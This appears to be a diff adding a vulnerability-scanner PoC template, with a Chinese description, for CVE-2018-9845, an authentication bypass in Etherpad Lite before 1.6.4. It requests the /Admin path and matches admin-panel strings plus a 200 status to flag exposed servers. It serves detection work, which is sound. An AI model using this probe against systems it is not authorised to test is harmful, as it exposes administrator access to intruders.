@@ -1,0 +1,35 @@
+[info]
+author = "AVE"
+description = "Etherpad Lite 1.6.4 之前版本存在管理员权限绕过漏洞。未经认证的攻击者可直接访问 /Admin 路径获取管理员面板权限，响应页面包含 Etherpad version、Plugin manager、Installed parts 等特征字符串。"
+id = "POC-AVE-2018-0223"
+name = "Etherpad Lite <1.6.4 管理员权限绕过漏洞 PoC"
+severity = "critical"
+tags = ["cve-2018-9845"]
+vuln_id = [
+    "CVE-2018-9845",
+    "AVE-2018-0223",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/Admin"
+protocol = "http"
+
+[[poc.requests.matchers]]
+condition = "and"
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Etherpad version",
+    "Plugin manager",
+    "Installed parts",
+]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
